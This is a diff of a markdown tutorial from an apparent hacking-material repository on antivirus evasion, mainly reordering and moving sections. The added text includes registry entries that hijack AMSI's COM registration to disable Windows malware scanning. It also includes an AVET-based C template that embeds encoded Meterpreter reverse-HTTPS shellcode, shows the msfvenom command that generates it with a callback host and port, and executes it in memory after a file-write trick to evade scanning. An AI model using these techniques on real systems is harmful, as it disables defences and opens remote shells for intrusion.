@@ -54,8 +54,8 @@
 [2] [Bash Obfuscation Technics (bash-sh)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bash-obfuscation-bash-sh)<br />
 [3] [Powershell Obfuscation Technics (psh-ps1)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#powershell-obfuscation-psh-ps1)<br />
 [4] [AMSI COM Bypass (hkcu hijacking)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#amsi-com-bypass-hkcu)<br />
-[5] [C to ANCII Obfuscated shellcode (c-ancii)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-to-ancii-obfuscation-c-ancii)<br />
-[6] [Bypass Sanbox Execution (AVET)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bypass-the-scan-engine-daniel-sauder-avet)<br />
+[5] [Bypass Sanbox Execution (AVET)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bypass-the-scan-engine-daniel-sauder-avet)<br />
+[6] [C to ANCII Obfuscated shellcode (c-ancii)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-to-ancii-obfuscation-c-ancii)<br />
 [7] [FInal Notes - Remarks](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#final-notes---remarks)<br />
 [8] [Special Thanks - Referencies](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#special-thanks)<br />
 
@@ -704,26 +704,95 @@ Here we can view the all process of encoding/decoding in powershell console
 
 ## AMSI COM Bypass (HKCU)
 
+      Microsoft’s Antimalware Scan Interface (AMSI) was introduced in Windows 10 as a standard interface
+      that provides the ability for AV engines to apply signatures to buffers both in memory and on disk.
+      [ Special thanks to enigma0x3 ]
+
+      Since the COM server is resolved via the HKCU hive first, a normal user can hijack the InProcServer32
+      key and register a non-existent DLL (or a malicious one if you like code execution). In order to do
+      this, there are two registry entries that need to be made:
+
+<br />
+
+      Windows Registry Editor Version 5.00
+      [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}]
+      [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32]
+      @="C:\\goawayamsi.dll"
+
+![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/VUXoF6.png)
+
+      When AMSI attempts to instantiate its COM component, it will query its registered CLSID and return a
+      non-existent COM server. This causes a load failure and prevents any scanning methods from being
+      accessed, ultimately rendering AMSI useless. Now, when we try to run our “malicious” AMSI test sample,
+      you will notice that it is allowed to execute because AMSI is unable to access any of the scanning
+      methods via its COM interface:
+
+![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/Tn2SZD.png)
+
+[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
+
+---
+
+<br /><br /><br /><br />
+
+## Bypass the scan engine (daniel sauder: avet)
+
+      This next technic writes a file to disk before executing shellcode into target ram ..
+      'Template taken from Avet anti-virus evasion tool presented in blackhat 2017'.
+
+---
+
+![avet bypass](http://i.cubeupload.com/ub18vo.png)
+
+---
+
+<br />
+
+**template.c** from AVET<br />
+
+
+      #include <stdio.h>
+      #include <stdlib.h>
+      #include <unistd.h>
+      #include <string.h>
+      #include <windows.h>
+      #include <tchar.h>
+      #include <stdlib.h>
+      #include <strsafe.h>
+
+      void exec_mycode(unsigned char *mycode)
+      {
+        int (*funct)();
+        funct = (int (*)()) mycode;
+        (int)(*funct)();
+      }
+
+
+      int main (int argc, char **argv)
+      {
+      /*
+      msfvenom -p windows/meterpreter/reverse_https lhost=192.168.153.149 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows
+      */
+
+      unsigned char buffer[]= 
+      "\xda\xcc\xba\x6f\x33\x72\xc4\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
+      "\x75\x31\x56\x18\x83\xc6\x04\x03\x56\x7b\xd1\x87\x38\x6b\x97"
+      "\x68\xc1\x6b\xf8\xe1\x24\x5a\x38\x95\x2d\xcc\x88\xdd\x60\xe0"
+      "\xe9\x88\xb7\xf5\xbc\x2b\x91\x9f\xbe\x78\xe1\xb5";
 	
+      /*
+      Here is the bypass. A file is written, this bypasses the scan engine
+      */
+        HANDLE hFile;
+	hFile= CreateFile(_T("hello.txt"), FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) 
+		exit(0);
 
-Microsoft’s Antimalware Scan Interface (AMSI) was introduced in Windows 10 as a standard interface that provides the ability for AV engines to apply signatures to buffers both in memory and on disk. This gives AV products the ability to “hook” right before script interpretation,
+	exec_mycode(buffer);
+      }
 
-Since the COM server is resolved via the HKCU hive first, a normal user can hijack the InProcServer32 key and register a non-existent DLL (or a malicious one if you like code execution). In order to do this, there are two registry entries that need to be made:
-
-Windows Registry Editor Version 5.00
-
-[HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}]
-
-[HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32]
-@="C:\\goawayamsi.dll"
-
-![enigma0x3 - AMSI Bypass](http://i.)
-
-When AMSI attempts to instantiate its COM component, it will query its registered CLSID and return a non-existent COM server. This causes a load failure and prevents any scanning methods from being accessed, ultimately rendering AMSI useless.
-
-Now, when we try to run our “malicious” AMSI test sample, you will notice that it is allowed to execute because AMSI is unable to access any of the scanning methods via its COM interface:
-
-
+[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
+[1] [avepoc - some pocs for antivirus evasion](https://github.com/govolution/avepoc)<br />
 
 ---
 
@@ -815,70 +884,6 @@ Now, when we try to run our “malicious” AMSI test sample, you will notice th
       gcc.exe template.c -o agent.exe
 
 [0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
-
----
-
-
-<br /><br /><br /><br />
-
-## Bypass the scan engine (daniel sauder: avet)
-
-      This next technic writes a file to disk before executing shellcode into target ram ..
-      'Template taken from Avet anti-virus evasion tool presented in blackhat 2017'.
-
----
-
-![avet bypass](http://i.cubeupload.com/ub18vo.png)
-
----
-
-<br />
-
-**template.c** from AVET<br />
-
-
-      #include <stdio.h>
-      #include <stdlib.h>
-      #include <unistd.h>
-      #include <string.h>
-      #include <windows.h>
-      #include <tchar.h>
-      #include <stdlib.h>
-      #include <strsafe.h>
-
-      void exec_mycode(unsigned char *mycode)
-      {
-        int (*funct)();
-        funct = (int (*)()) mycode;
-        (int)(*funct)();
-      }
-
-
-      int main (int argc, char **argv)
-      {
-      /*
-      msfvenom -p windows/meterpreter/reverse_https lhost=192.168.153.149 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows
-      */
-
-      unsigned char buffer[]= 
-      "\xda\xcc\xba\x6f\x33\x72\xc4\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
-      "\x75\x31\x56\x18\x83\xc6\x04\x03\x56\x7b\xd1\x87\x38\x6b\x97"
-      "\x68\xc1\x6b\xf8\xe1\x24\x5a\x38\x95\x2d\xcc\x88\xdd\x60\xe0"
-      "\xe9\x88\xb7\xf5\xbc\x2b\x91\x9f\xbe\x78\xe1\xb5";
-	
-      /*
-      Here is the bypass. A file is written, this bypasses the scan engine
-      */
-        HANDLE hFile;
-	hFile= CreateFile(_T("hello.txt"), FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
-	if (hFile == INVALID_HANDLE_VALUE) 
-		exit(0);
-
-	exec_mycode(buffer);
-      }
-
-[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
-[1] [avepoc - some pocs for antivirus evasion](https://github.com/govolution/avepoc)<br />
 
 ---
 
